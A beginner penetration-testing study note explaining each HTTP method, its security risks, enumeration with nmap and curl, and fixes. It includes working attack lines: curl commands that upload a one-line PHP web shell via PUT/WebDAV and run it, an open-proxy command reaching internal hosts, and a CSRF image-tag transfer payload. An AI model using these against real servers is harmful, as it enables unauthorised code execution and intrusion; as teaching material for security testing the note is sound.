---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.06 HTTP Methods — GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT"
---

# 02.06 — HTTP Methods — All Methods and Security

## What is it?

HTTP methods (also called HTTP verbs) tell the server what action to perform on the resource. Each method has intended semantics — but incorrect server configuration can enable unintended access. Knowing which methods a server accepts and what they do is core to web pentesting.

---

## All HTTP Methods

```
METHOD    INTENDED USE               BODY?   SAFE?  IDEMPOTENT?
──────────────────────────────────────────────────────────────────
GET       Retrieve a resource        No      Yes    Yes
HEAD      GET headers only           No      Yes    Yes
POST      Create/submit data         Yes     No     No
PUT       Replace resource entirely  Yes     No     Yes
PATCH     Partial update             Yes     No     No
DELETE    Delete a resource          No      No     Yes
OPTIONS   List allowed methods       No      Yes    Yes
TRACE     Echo request back          No      Yes    Yes
CONNECT   Tunnel (for proxies)       —       No     No

SAFE = doesn't modify server state
IDEMPOTENT = multiple identical requests same result as one
```

---

## GET

```http
GET /products?category=shoes&sort=price HTTP/1.1
Host: target.com
Cookie: session=abc123

→ Returns page of shoe products sorted by price

PENTEST POINTS:
- Parameters in URL (not body) → visible in logs, browser history, Referer header
- Sensitive data should NOT be in GET params (passwords, tokens)
- CSRF: GET requests with state-changing effects → CSRF!
  (e.g., /admin/delete-user?id=123 — clickable link = CSRF)
- Cache: GET responses may be cached → cache poisoning
```

---

## HEAD

```http
HEAD /api/v1/data HTTP/1.1
Host: target.com

→ Returns ONLY headers (no body)

PENTEST USES:
- Check if endpoint exists without downloading body (fast recon)
- Check file size (Content-Length) without downloading
- Check if endpoint requires auth without getting blocked
- Compare HEAD vs GET behavior → request smuggling or WAF bypass

curl -I https://target.com/admin/
# 200 OK → admin panel exists (even if you can't access it)
```

---

## POST

```http
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 45

{"username":"alice","email":"alice@test.com"}

→ Creates new user

PENTEST POINTS:
- Parameters in body → not in logs by default (but still visible in Burp)
- No CSRF protection? → CSRF with hidden form
- Mass assignment: can you add "isAdmin": true to POST body?
- Business logic: can you POST the same order twice?
```

---

## PUT

```http
PUT /api/users/123 HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"alice","email":"alice@test.com","isAdmin":true}

→ Replaces user 123 entirely

PENTEST POINTS:
- If PUT enabled without auth → create/overwrite files!
- WebDAV + PUT → upload webshells!
- PUT to /shell.php + execute = RCE

ATTACK:
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" \
  https://target.com/shell.php
```

---

## PATCH

```http
PATCH /api/users/123 HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"newemail@test.com"}

→ Partially updates user 123

PENTEST POINTS:
- Mass assignment: try patching fields you shouldn't (isAdmin, role, etc.)
- Horizontal privilege escalation: PATCH /api/users/124 (someone else's)
```

---

## DELETE

```http
DELETE /api/posts/456 HTTP/1.1
Host: target.com
Cookie: session=abc123

→ Deletes post 456

PENTEST POINTS:
- IDOR: DELETE /api/posts/457 (not yours) → delete other users' posts
- Missing auth check → delete without being logged in
- No soft delete → unrecoverable data loss
```

---

## OPTIONS

```http
OPTIONS /api/users HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Origin: *

→ Tells you which methods are allowed

PENTEST USES:
- Map the attack surface: what methods exist?
- Discover dangerous methods enabled (PUT, DELETE)
- Check CORS configuration (Access-Control-Allow-Origin: * → CORS vulnerability)
- Pre-flight CORS check before cross-origin request

nmap --script http-methods target.com
curl -X OPTIONS -I https://target.com/
```

---

## TRACE

```http
TRACE / HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1       ← Server echoes back your request!
Host: target.com
Cookie: session=abc123 ← Your cookies echoed back!

→ Server echoes the request back (for debugging)

ATTACK: XST (Cross-Site Tracing):
- Victim's browser sends TRACE request to target.com
- Browser's Cookie header (even HttpOnly!) echoed back
- JavaScript reads the response → gets HttpOnly cookie!
- Bypasses HttpOnly protection!
- Modern browsers block TRACE from JS, but old ones didn't

DETECT:
curl -X TRACE https://target.com/
# If server echoes request → TRACE enabled → should be disabled
```

---

## CONNECT

```http
CONNECT target.com:443 HTTP/1.1
Host: proxy.example.com:8080

→ Creates a tunnel through a proxy

PENTEST USES:
- Open proxy detection: CONNECT through target to other hosts
- Port forwarding through HTTP proxies
- If server implements CONNECT and allows arbitrary destinations → open proxy!

ATTACK: If target proxies CONNECT requests:
curl -x http://target.com:3128 https://internal.corp/admin
# Uses target as open proxy to reach internal services!
```

---

## Security Context — HTTP Methods in VAPT

### Method Enumeration

```bash
# Use Nmap to enumerate allowed methods
nmap --script http-methods -p 80,443 target.com

# Manual with curl OPTIONS
curl -sI -X OPTIONS https://target.com/ | grep -i allow

# For each interesting path:
for path in / /admin /api /upload; do
  echo "--- $path ---"
  curl -sI -X OPTIONS "https://target.com$path" | grep -i allow
done

# Try all methods manually:
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
  echo "$method:"
  curl -sI -X $method https://target.com/ | head -2
done
```

### WebDAV — PUT/MKCOL/PROPFIND

```bash
# WebDAV enumeration
nmap --script http-webdav-scan target.com -p 80,443
davtest -url http://target.com/webdav/    ← test writable WebDAV

# If PUT enabled on WebDAV:
curl -X PUT http://target.com/webdav/shell.php \
  --data-binary "<?php system(\$_GET['cmd']); ?>"

# Try to execute:
curl "http://target.com/webdav/shell.php?cmd=id"
```

### CSRF via GET Method

```
If state-changing action uses GET:
  /admin/delete?user=alice
  /transfer?amount=1000&to=attacker

Any page that embeds this URL executes the action on victim's behalf!
  <img src="https://bank.com/transfer?amount=1000&to=attacker">
No JavaScript needed — just an image tag!
```

---

## Hands-On: Method Testing

```bash
# Quick method test
for m in GET POST PUT DELETE PATCH OPTIONS TRACE HEAD CONNECT; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $m https://target.com/)
  echo "$m: $code"
done

# Test PUT file upload
curl -X PUT -d "test content" https://target.com/test.txt
curl https://target.com/test.txt   # Can you read it back?

# Test TRACE (should return 405 Method Not Allowed if patched)
curl -X TRACE -v https://target.com/ 2>&1 | head -20
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| TRACE enabled | Disable TRACE in web server config |
| PUT/DELETE without auth | Require authentication for all write methods |
| GET requests with state changes | Move state-changing actions to POST/PUT/DELETE |
| CONNECT on non-proxy server | Disable CONNECT unless running a proxy |
| OPTIONS shows sensitive methods | Don't expose unnecessary allowed methods |

---

## Related Notes
- [[04 - HTTP Request Structure]] — full request structure
- [[07 - HTTP Status Codes]] — method not allowed = 405
- [[Module 07 - CSRF]] — GET-based CSRF
- [[Module 09 - HTTP Request Smuggling]] — method confusion
- [[Module 15 - File Upload]] — exploiting PUT for webshell
